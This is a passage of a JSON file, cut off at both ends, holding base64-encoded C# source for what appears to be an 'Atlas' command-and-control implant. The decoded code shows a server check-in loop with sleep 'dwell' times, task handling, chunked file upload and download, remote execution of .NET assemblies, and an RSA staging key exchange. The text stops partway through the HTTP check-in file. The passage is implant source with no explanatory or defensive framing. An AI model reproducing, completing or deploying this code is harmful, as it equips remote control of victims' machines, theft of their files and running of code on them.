5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YS5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgVXBsb2FkVGFza2luZyBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gVXBsb2FkVGFza2luZy5QYXJzZShtZXNzYWdlLCBVcGxvYWRUYXNraW5nRm9ybWF0KTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDIpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFVwbG9hZFRhc2tpbmcNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFzc2VtYmx5X2lkID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICByZW1vdGVfcGF0aCA9IHBhcnNlTGlzdFsxXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgUnVuQXNzZW1ibHkNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhcmdzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYXNzZW1ibHlfaWQgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBSdW5Bc3NlbWJseUZvcm1hdCA9IEAiIiJhc3NlbWJseV9pZCIiOiAiInswfSIiLCAiImFyZ3MiIjogIiJ7MX0iIiI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxcIiwgQCIiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhLlJlcGxhY2UoQCJcIiwgQCIiKSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBSdW5Bc3NlbWJseSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gUnVuQXNzZW1ibHkuUGFyc2UobWVzc2FnZSwgUnVuQXNzZW1ibHlGb3JtYXQpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMikgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUnVuQXNzZW1ibHkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFyZ3MgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgIGFzc2VtYmx5X2lkID0gcGFyc2VMaXN0WzBdDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBVcGxvYWQNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCBjaHVua19zaXplIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZmlsZV9pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IGNodW5rX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZ1bGxfcGF0aCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRhc2tfaWQgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJhY3Rpb24iIjoiInswfSIiLCIiY2h1bmtfc2l6ZSIiOnsxfSwiImZpbGVfaWQiIjoiInsyfSIiLCIiY2h1bmtfbnVtIiI6ezN9LCAiImZ1bGxfcGF0aCIiOiAiIns0fSIiLCIidGFza19pZCIiOiIiezV9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRvSnNvbihVcGxvYWQgdXBsb2FkKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcuRm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICB1cGxvYWQuSnNvbkZvcm1hdCwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh1cGxvYWQuYWN0aW9uKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh1cGxvYWQuY2h1bmtfc2l6ZS5Ub1N0cmluZygpKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh1cGxvYWQuZmlsZV9pZCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmNodW5rX251bS5Ub1N0cmluZygpKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh1cGxvYWQuZnVsbF9wYXRoKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh1cGxvYWQudGFza19pZCkNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBwdWJsaWMgY2xhc3MgVXBsb2FkUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCB0b3RhbF9jaHVua3MgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCBjaHVua19udW0geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBjaHVua19kYXRhIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZmlsZV9pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRhc2tfaWQgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVcGxvYWRSZXNwb25zZUZvcm1hdCA9IEAie3siImFjdGlvbiIiOiAiInswfSIiLCAiInRvdGFsX2NodW5rcyIiOiB7MX0sICIiY2h1bmtfbnVtIiI6IHsyfSwgIiJjaHVua19kYXRhIiI6ICIiezN9IiIsICIiZmlsZV9pZCIiOiAiIns0fSIiLCAiInRhc2tfaWQiIjogIiJ7NX0iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgQCJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezN9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInszfSIsICIoPydncm91cDMnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7NH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezR9IiwgIig\/J2dyb3VwNCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoIns1fSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7NX0iLCAiKD8nZ3JvdXA1Jy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhLlJlcGxhY2UoQCJcIiwgQCIiKSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDIiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMyJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwNCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDQiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDUiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXA1Il0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgVXBsb2FkUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IFVwbG9hZFJlc3BvbnNlLlBhcnNlKG1lc3NhZ2UsIFVwbG9hZFJlc3BvbnNlRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gNikgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgVXBsb2FkUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gSW50MzIuUGFyc2UocGFyc2VMaXN0WzFdKSwNCiAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gSW50MzIuUGFyc2UocGFyc2VMaXN0WzJdKSwNCiAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IHBhcnNlTGlzdFszXSwNCiAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IHBhcnNlTGlzdFs0XSwNCiAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHBhcnNlTGlzdFs1XQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgRG93bmxvYWRSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHN0YXR1cyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgRG93bmxvYWRSZXNwb25zZUZvcm1hdCA9IEAie3siInN0YXR1cyIiOiAiInswfSIiLCAiImZpbGVfaWQiIjogIiJ7MX0iIiwgIiJ0YXNrX2lkIiI6ICIiezJ9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsIEAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YS5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMiJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIERvd25sb2FkUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IERvd25sb2FkUmVzcG9uc2UuUGFyc2UobWVzc2FnZSwgRG93bmxvYWRSZXNwb25zZUZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDUpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IERvd25sb2FkUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHBhcnNlTGlzdFsyXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgR2V0U3RhZ2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBwdWJfa2V5IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc2Vzc2lvbl9pZCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siImFjdGlvbiIiOiIiezB9IiIsIiJwdWJfa2V5IiI6IiJ7MX0iIiwiInNlc3Npb25faWQiIjoiInsyfSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oR2V0U3RhZ2UgZ2V0X3N0YWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcuRm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICBnZXRfc3RhZ2UuSnNvbkZvcm1hdCwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShnZXRfc3RhZ2UuYWN0aW9uKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShnZXRfc3RhZ2UucHViX2tleSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoZ2V0X3N0YWdlLnNlc3Npb25faWQpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBTdGFnZVJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdXVpZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHNlc3Npb25fa2V5IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc2Vzc2lvbl9pZCB7IGdldDsgc2V0OyB9DQoNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siInV1aWQiIjogIiJ7MH0iIiwgIiJzZXNzaW9uX2tleSIiOiAiInsxfSIiLCAiImFjdGlvbiIiOiAiInsyfSIiLCAiInNlc3Npb25faWQiIjogIiJ7M30iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgQCJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezN9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInszfSIsICIoPydncm91cDMnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEuUmVwbGFjZShAIlwiLCBAIiIpKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDMiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgU3RhZ2VSZXNwb25zZSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gU3RhZ2VSZXNwb25zZS5QYXJzZShtZXNzYWdlLCBKc29uRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gNCkgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgU3RhZ2VSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gcGFyc2VMaXN0WzJdLA0KICAgICAgICAgICAgICAgICAgICB1dWlkID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uX2tleSA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9pZCA9IHBhcnNlTGlzdFszXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQp9DQo="
        },
        {
          "Program.cs": "77u\/bmFtZXNwYWNlIEF0bGFzDQp7DQogICAgY2xhc3MgUHJvZ3JhbQ0KICAgIHsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykNCiAgICAgICAgew0KICAgICAgICAgICAgVXRpbHMuR2V0U2VydmVycygpOw0KICAgICAgICAgICAgd2hpbGUgKCFIdHRwLkNoZWNrSW4oKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpbnQgRHdlbGwgPSBVdGlscy5HZXREd2VsbFRpbWUoKTsNCiAgICAgICAgICAgICAgICBTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZC5TbGVlcChEd2VsbCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBVdGlscy5Kb2JMaXN0IEpvYkxpc3QgPSBuZXcgVXRpbHMuSm9iTGlzdA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGpvYl9jb3VudCA9IDAsDQogICAgICAgICAgICAgICAgam9icyA9IHsgfQ0KICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIHdoaWxlICh0cnVlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFV0aWxzLkxvb3AoSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgaW50IER3ZWxsID0gVXRpbHMuR2V0RHdlbGxUaW1lKCk7DQogICAgICAgICAgICAgICAgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQuU2xlZXAoRHdlbGwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0K"
        },
        {
          "Http_4.0.cs": "77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5MaW5xOw0KI2lmIERFRkFVTFQNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KI2VuZGlmDQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBNaWNyb3NvZnQuV2luMzI7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIHB1YmxpYyBjbGFzcyBIdHRwDQogICAgew0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgQ2hlY2tJbigpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KI2lmIERFRkFVTFRfRUtFDQogICAgICAgICAgICAgICAgQ3J5cHRvLkdlblJzYUtleXMoKTsNCiAgICAgICAgICAgICAgICBVdGlscy5HZXRTdGFnZSBHZXRTdGFnZSA9IG5ldyBVdGlscy5HZXRTdGFnZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInN0YWdpbmdfcnNhIiwNCiAgICAgICAgICAgICAgICAgICAgcHViX2tleSA9IENyeXB0by5HZXRQdWJLZXkoKSwNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9pZCA9IFV0aWxzLkdldFNlc3Npb25JZCgpDQoNCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIENvbmZpZy5TZXNzaW9uSWQgPSBHZXRTdGFnZS5zZXNzaW9uX2lkOw0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENyeXB0by5FbmNyeXB0U3RhZ2UoVXRpbHMuR2V0U3RhZ2UuVG9Kc29uKEdldFN0YWd